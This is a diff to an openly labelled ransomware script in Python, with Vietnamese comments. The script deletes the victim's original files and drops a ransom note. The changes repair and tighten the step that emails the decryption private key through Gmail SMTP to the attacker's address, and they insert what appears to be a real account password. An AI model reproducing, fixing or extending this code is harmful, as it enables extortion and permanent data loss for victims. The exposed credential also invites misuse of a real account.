@@ -51,6 +51,10 @@ os.remove(input_file) # xoa file ban dau
 
 #gui khóa bí mật về phái máy tấn công
 
+private_key_file = 'private_key.txt'
+with open(private_key_file, 'wb') as f:
+    f.write(pem)
+
 fromaddr = "demomalware931@gmail.com"
 toaddr = "vongnguyetvongnguyet@gmail.com"
 msg = MIMEMultipart()
@@ -61,22 +65,24 @@ body = "Private key"
 
 #file đính kèm
 msg.attach(MIMEText(body, 'plain'))
-filename = "private_key.txt"
+filename = private_key_file
 attachment = open(filename, "rb")
 
 part = MIMEBase('application', 'octet-stream')
 part.set_payload((attachment).read())
 encoders.encode_base64(part)
-part.add_header(('Content-Disposition', 'attachment; filename = %s' % filename))
+part.add_header('Content-Disposition', 'attachment', filename=filename)
 msg.attach(part)
 server = smtplib.SMTP('smtp.gmail.com', 587) # python ucng cap thu vien smtplib su dung nhu mot smtp client de thuc hien gui mail
 
 server.starttls()
-server.login(fromaddr, 'demomalware123')
+server.login(fromaddr, 'snse ties awal kirc')
 text = msg.as_string()
 server.sendmail(fromaddr, toaddr, text) #gui thu
 attachment.close()
 server.quit()
+
+os.remove(private_key_file)
 
 infor = open('README.txt', 'wb')
 infor.write('File cua ba da bi ma hoa. Muon lay lai du lieu lien he ..........'.encode('utf-8'))
